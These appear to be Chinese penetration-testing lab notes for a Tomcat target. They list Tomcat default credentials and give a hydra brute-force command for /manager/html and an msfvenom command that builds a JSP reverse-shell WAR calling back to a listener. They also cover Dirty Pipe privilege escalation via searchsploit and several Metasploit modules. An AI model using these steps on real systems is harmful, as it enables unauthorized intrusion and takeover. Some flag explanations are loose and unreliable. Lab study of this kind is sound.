# 01.Cat 技术要点

## 端口扫描

```bash
ip=192.168.1.100
nmap -p- -n --min-rate 7000 -sSCV -oN nmap_result $ip
```

扫描一个IP地址（$ip）的所有端口：

- **-p-**: 扫描所有端口，而不是默认的1000个端口。
- **-n**: 不要进行DNS解析，以加快扫描速度。
- **--min-rate 7000**: 以每秒7000个数据包的速率进行扫描。这可以帮助加快扫描速度，但可能会影响网络性能。
- **-sS**: 使用TCP SYN扫描技术。这是一种快速的扫描技术，可以在不完全建立连接的情况下确定端口是否开放。
- **-C**: 在扫描过程中进行脚本扫描。这些脚本可以用来识别目标主机上的漏洞或服务。
- **-V**: 输出详细的扫描结果。
- **-oN nmap_result**: 将扫描结果保存到一个文件中，文件名为 `nmap_result` 。

## Tomcat

Tomcat是免费、开源的Web应用服务器，可以运行按照J2EE中的Servlet规范编写好的Java程序。Tomcat的 `/manager` 和 `/host-manager` 端点通常提供服务器管理功能，包括应用的上传部署和状态监控。

Tomcat的端点可能会使用 `HTTP Basic Authentication` 进行密码保护。

Tomcat常见的默认 `用户名:密码` 有：

- admin:admin
- tomcat:tomcat
- admin:（空）
- admin:s3cr3t
- tomcat:s3cr3t
- admin:tomcat

## 密码爆破

使用 `hydra` 进行 `HTTP Basic Authentication` 密码爆破：

```bash
hydra -ensr -f -C defaultpasslist.txt $ip -s 8080 http-head "/manager/html" | tee hydra_result
```

- `-e nsr`: 这是 Hydra 的一个选项，指示 Hydra 对每个用户名尝试空密码、该用户名本身和其反转作为密码。
  - `n`: 尝试空密码
  - `s`: 尝试使用用户名作为密码
  - `r`: 尝试使用用户名的反转作为密码
- `-f`: 这个选项告诉 Hydra 一旦找到一个密码就停止攻击。
- `-C defaultpasslist.txt`: 指定一个`用户名:密码`字典文件来进行密码爆破尝试。
- `$ip`: 目标服务器的 IP 地址。
- `-s 8080`: 目标服务的端口号
- `http-head "/manager/html"`: 指定使用 `HTTP HEAD` 方法测试的路径。
- `| tee hydra_result`: 将命令行的输出显示在屏幕上，并保存到 `hydra_result` 文件中。

## reverse shell

用 `msfvenom` 生成 `war` 文件格式的 java reverse shell ：

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.200 LPORT=7788 -f war > shell.war
```

- `-p java/jsp_shell_reverse_tcp`：指定要使用的有效载荷类型，这里是Java反向Shell。
- `LHOST=192.168.1.200`：指定反向Shell连接的IP地址，这里是192.168.1.200。
- `LPORT=7788`：指定反向Shell连接的端口号，这里是7788。
- `-f war`：指定输出文件的格式，这里是WAR文件格式。
- `> shell.war`：将生成的WAR文件输出到名为shell.war的文件中。

这个命令将生成一个名为`shell.war`的WAR文件，其中包含一个Java反向Shell，该Shell将连接到IP地址为`192.168.1.200`，端口号为`7788`的主机。

## 查看 linux 内核版本

```bash
uname -a
```

## linux 内核提权

linux内核版本 `5.8 - 5.16.11` 可能有 `dirty pipe` 提权漏洞（ `CVE-2022-0847` ）。

在 kali linux 下可以直接搜索 `exploitdb` 获得漏洞利用代码。

```bash
┌──(root㉿k)-[~/practices/tomcat81]
└─# searchsploit --cve CVE-2022-0847
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
Linux Kernel 5.8 < 5.16.11 - Local Privilege Escalation (DirtyPipe)  | linux/local/50808.c
--------------------------------------------------------------------- ---------------------------------
```

## metasploit framework 相关模块

- **auxiliary/scanner/http/tomcat_mgr_login** : tomcat /manager 缺省密码爆破
- **exploit/multi/http/tomcat_mgr_upload** : tomcat /manager 渗透
- **post/multi/recon/local_exploit_suggester** : 本地提权建议
- **exploit/linux/local/cve_2022_0847_dirtypipe** : 利用 `dirty pipe` 漏洞提权
